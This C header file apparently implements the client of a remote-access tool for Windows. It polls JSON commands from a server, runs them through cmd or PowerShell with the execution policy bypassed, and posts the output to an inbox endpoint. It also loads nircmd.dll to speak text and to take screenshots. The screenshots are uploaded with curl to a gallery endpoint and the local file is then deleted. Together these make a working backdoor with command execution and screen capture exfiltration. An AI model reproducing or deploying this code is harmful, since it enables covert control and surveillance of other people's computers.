#ifndef PROCC
#define PROCC
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define TOKEN "9de001b11d8c3cfcbb239452d59fbc41"
#define IP_PORT "http://127.0.0.1:5000"

int do_take = 0;
char* json_escape(const char* input);
int send_json_string(const char* json_string, const char* target_url);
int split_commands(const char *command);

#define TERMINAL_MAX_LEN 5
#define COMMAND_MAX_LEN 1024

typedef BOOL (WINAPI *SetProcessDPIAwareFunc)();

typedef struct {
    char terminal[TERMINAL_MAX_LEN];
    char command[COMMAND_MAX_LEN];
    int id;
} JSON;

JSON* json;
extern char* commands[];
typedef int(__cdecl *NCmd)(char *);

int process_json_file(char* response, size_t size) {
    if (!response || size == 0) return -1;
    
    json = (JSON*)malloc(sizeof(JSON));
    if (!json) return -2;
    
    memset(json, 0, sizeof(JSON));
    
    // printf("json : %.*s",size, response);
    int r = sscanf(response,
        " { \"command\" : \"%1023[^\"]\" , \"id\" : %d , \"terminal\" : \"%4[^\"]\" } ",
        json->command,
        &json->id,
        json->terminal);
    if (r != 3) {

        free(json);
        json = NULL;
        return -3;
    }
    
    return 0;  
}

char* handle_commands(char** commands, int count)
{
    int size_info = 0;
    int capacity_info = 1024;
    char* INFO = (char*)malloc(capacity_info * sizeof(char));
    memset(INFO, 0, capacity_info * sizeof(char));

    for (int i = 0; i < count; i++)
    {
        if (strnicmp(commands[i], "cd", 2) == 0)
        {
            char current_dir[512] = {0};
            char cur_dir[512] = {0};
            char new_dir[512] = "\n<path> ";
            char feedback[512] = "";  // پیش‌فرض: هیچ متنی نشون نده (مثل cmd واقعی)

            GetCurrentDirectoryA(sizeof(current_dir), current_dir);

            // حالت 1: فقط cd یا cd با اسپیس → برو به پوشه کاربر
            if (strlen(commands[i]) <= 3 || commands[i][3] == ' ' || commands[i][3] == '\0')
            {
                char* home = getenv("USERPROFILE");
                if (home) SetCurrentDirectoryA(home);
            }
            else
            {
                char target[460];
                strcpy(target, commands[i] + 3);
                char* ptr = target;

                // حذف اسپیس‌های اول
                while (*ptr == ' ') ptr++;

                // حذف کوتیشن
                if (ptr[0] == '"' && ptr[strlen(ptr)-1] == '"')
                {
                    ptr[strlen(ptr)-1] = 0;
                    ptr++;
                }

                if (!SetCurrentDirectoryA(ptr))
                {
                    DWORD err = GetLastError();
                    if (err == 2 || err == 3)
                        strcpy(feedback, "The system cannot find the path specified.");
                    else
                        snprintf(feedback, sizeof(feedback), "Error %lu: Cannot change directory", err);
                }
            }

            // مسیر جدید رو بگیر
            GetCurrentDirectoryA(sizeof(cur_dir), cur_dir);
            strcat(new_dir, cur_dir);
            
            if (new_dir[strlen(new_dir)-1] != '\\')
            {
                strcat(new_dir, "\\");
                strcat(new_dir, "\n");
            }

            // حالا بسته به موفق/ناموفق، info رو متفاوت بساز
            char* esc_info;
            if (strlen(feedback) == 0)
            {
                esc_info = json_escape(new_dir);
            }
            else
            {
                // ناموفق: فقط متن خطا
                esc_info = json_escape(feedback);
            }

            if ((capacity_info - size_info) < strlen(esc_info))
            {
                capacity_info *= 2;
                char *tmp = realloc(INFO, capacity_info);
                if (tmp)
                    INFO = tmp;
                else{
                    capacity_info /= 2;
                    continue;
                } 
                    
            }

            strcat(INFO, esc_info);
            strcat(INFO, "\\n");
            free(esc_info);
            size_info = strlen(INFO);
        }
        else
        {
            char full_cmd[COMMAND_MAX_LEN + 60];

            
            if(strcmp(json->terminal, "cmd") == 0)
                snprintf(full_cmd, sizeof(full_cmd), "cmd /c %s 2>&1", commands[i]);
            else
                snprintf(full_cmd, sizeof(full_cmd), "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"%s\" 2>&1", commands[i]);

            FILE *fp = popen(full_cmd, "r");
            if (fp == NULL)
            {
                if ((capacity_info - size_info) < 100)
                {
                    capacity_info *= 2;
                    char *tmp = realloc(INFO, capacity_info);
                    if (tmp)
                        INFO = tmp;
                    else{
                        capacity_info /= 2;
                        continue;
                    } 
                     
                }
                strcat(INFO, "<error> Failed to run command : ");
                strcat(INFO, commands[i]);
                strcat(INFO, "\\n");
                size_info = strlen(INFO);
                continue;
            }   

            size_t capacity = 1024;
            size_t len = 0;

            char *output = malloc(capacity);
            if (!output) 
            {
                pclose(fp);
                continue;
            }

            output[0] = '\0';

            char buf[256];

            while (fgets(buf, sizeof(buf), fp)) {
                size_t buflen = strlen(buf);

                if (len + buflen + 1 > capacity) {
                    capacity *= 2;
                    char *tmp = realloc(output, capacity);
                    if (!tmp) {
                        free(output);
                        break;
                    }
                    output = tmp;
                }

                memcpy(output + len, buf, buflen);
                len += buflen;
                output[len] = '\0';
            }
            int exit_code = pclose(fp);

            char* esc_out = json_escape(output);
            free(output);

            int needed = strlen(esc_out) + 20; // +20 برای <error> و \n
            
            // آیا INFO جا دارد؟
            if (size_info + needed >= capacity_info) {
                // محاسبه دقیق سایز جدید
                int new_cap = capacity_info;
                while(size_info + needed >= new_cap) new_cap *= 2;
                
                char *tmp = (char*)realloc(INFO, new_cap);
                if (tmp) {
                    INFO = tmp;
                    capacity_info = new_cap;
                }
            }
            
            int is_help_cmd = (strnicmp(commands[i], "help", 4) == 0);
            if (exit_code != 0 && !is_help_cmd) // command is field
                strcat(INFO, "<error> ");

            strcat(INFO, esc_out);
            strcat(INFO, "\\n");
            free(esc_out);
            size_info = strlen(INFO);
        }
    }
    strcat(INFO, "\0");
    return INFO;
    
}

void create_output(char* info)
{
    const char* urlSend = IP_PORT "/api/user/" TOKEN "/inbox";
    
    int total_size;
    char* temp = "<error>";

    if (info == NULL)
    {
        total_size = 512*sizeof(char);
        info = temp;
    } 
    else
        total_size = strlen(info) + 512*sizeof(char);
    
    char *json_output = (char*)malloc(total_size);

    snprintf(json_output, total_size,
        "{\"type\":\"%s\",\"msg\":\"%s\",\"id\":%d,\"info\":\"%s\"}",
        json->terminal, json->command, json->id, info ? info : "");

    free(info);
    free(json);
    json = NULL;

    int Send_OK = send_json_string(json_output, urlSend);
    !Send_OK ? printf("*** Sending is succsessfull\n") : printf("*** Sending is faild\n"); 
    free(json_output);
}

void CMD_PS_execute()
{
    int count = split_commands(json->command);
    char *esc_out = handle_commands(commands, count);
    create_output(esc_out);
}

void dll_execute() {

    if (!json->command || strlen(json->command) == 0) {
        create_output(json_escape("<error> Empty command"));
        return;
    }

    HINSTANCE nircmd = LoadLibraryA("nircmd.dll");
    
    if (!nircmd) {
        create_output(json_escape("<error> nircmd.dll not found in project directory"));
        return;
    }

    NCmd DoNirCmd = (NCmd)GetProcAddress(nircmd, "DoNirCmd");
    if (!DoNirCmd) {
        FreeLibrary(nircmd);
        create_output(json_escape("<error> Could not find function DoNirCmd in DLL"));
        return;
    }

    int result = DoNirCmd(json->command);
        
    if(result == 1)
        create_output(json_escape("Command executed successfully"));
    else
        create_output(json_escape("<error> Crash occurred during DLL execution"));
    
    FreeLibrary(nircmd);
}

void say_execute()
{
    char finalCommand[200]; 
    snprintf(finalCommand, sizeof(json->command), "speak text \"%s\"", json->command);

    HINSTANCE nircmd = LoadLibrary(TEXT("nircmd.dll"));
    if (!nircmd) {
        printf("Error: Load nircmd.dll\n");
        return;
    }

    NCmd DoNirCmd = (NCmd)GetProcAddress(nircmd, "DoNirCmd");
    if (DoNirCmd) {
        DoNirCmd(finalCommand);

        char output[256] = "I said to them: ";
        strcat(output, json->command);
        char* esc_out = json_escape(output);
        create_output(esc_out);

    }

    FreeLibrary(nircmd);
    return;

}

void take_photo()
{ 
     // ۱. حل مشکل DPI (باعث می‌شود عکس کامل گرفته شود)
    HMODULE hUser32 = LoadLibrary(TEXT("user32.dll"));
    if (hUser32) {
        SetProcessDPIAwareFunc setDPIAware = (SetProcessDPIAwareFunc)GetProcAddress(hUser32, "SetProcessDPIAware");
        if (setDPIAware) setDPIAware();
        FreeLibrary(hUser32);
    }
    
    const char* filename = "temp_capture.png";
    char nircmd_cmd[256];
    char curl_cmd[1024];
    const char* gallery_url = IP_PORT "/api/user/" TOKEN "/gallery";

    // 1. ساخت دستور اسکرین‌شات
    snprintf(nircmd_cmd, sizeof(nircmd_cmd), "savescreenshot \"%s\"", filename);

    HINSTANCE nircmd = LoadLibrary(TEXT("nircmd.dll"));
    if (!nircmd) {
        create_output(json_escape("<error> nircmd.dll not found"));
        return;
    }

    NCmd DoNirCmd = (NCmd)GetProcAddress(nircmd, "DoNirCmd");
    if (DoNirCmd) {
        // 2. گرفتن عکس
        DoNirCmd(nircmd_cmd);
        
        // صبر برای ذخیره شدن فایل روی دیسک
        int timeout = 0;
        // تا وقتی فایل وجود ندارد (INVALID_FILE_ATTRIBUTES) و تایم‌اوت نشده صبر کن
        while (GetFileAttributesA(filename) == INVALID_FILE_ATTRIBUTES && timeout < 20) {
            Sleep(100);
            timeout++;
        }

        // 4. ساخت دستور CURL
        // سوئیچ -F برای ارسال multipart/form-data است
        // علامت @ قبل از نام فایل ضروری است تا محتوای فایل ارسال شود
        // سوئیچ -s برای حالت silent (بی‌صدا) است
        snprintf(
            curl_cmd,
            sizeof(curl_cmd),
            "curl -s -S -o NUL -X POST -F \"file=@%s\" \"%s\"",
            filename,
            gallery_url
        );
        
        // 5. اجرای دستور با system
        int result = system(curl_cmd);

        if (result == 0) {
            printf("** Photo captured and uploaded via CURL\n");
        } else {
            printf("<error> CURL execution failed\n");
        }

        // 6. حذف فایل موقت
        DeleteFileA(filename);
    } else {
        printf("<error> DoNirCmd function not found\n");
    }

    FreeLibrary(nircmd);
}

void pic_execute()
{
    // change state do_take
    if (strcmp(json->command , "on") == 0)
        do_take = 1;
    else 
        do_take = 0;

    create_output(json_escape("successfully"));
    
}

void proccess_command(char *response, size_t size)
{
    int out = process_json_file(response, size);

    // out process_json
    // out == -1 --> response is empty
    // out == -2 --> malloc is field
    // out == -3 --> error in sscanf for write in JSON
    // out == 0  --> correct 
    if (out != 0) {
        free(json);
        json = NULL;
        return;
    }

    if (strcmp(json->terminal, "ps") == 0 || strcmp(json->terminal, "cmd") == 0)
        CMD_PS_execute();
    else if (strcmp(json->terminal, "dll") == 0)
        dll_execute();
    else if (strcmp(json->terminal, "say") == 0)
        say_execute();
    else if (strcmp(json->terminal, "pic") == 0)
        pic_execute();
    else
        printf("Unknown terminal type: %s\n", json->terminal);
}

#endif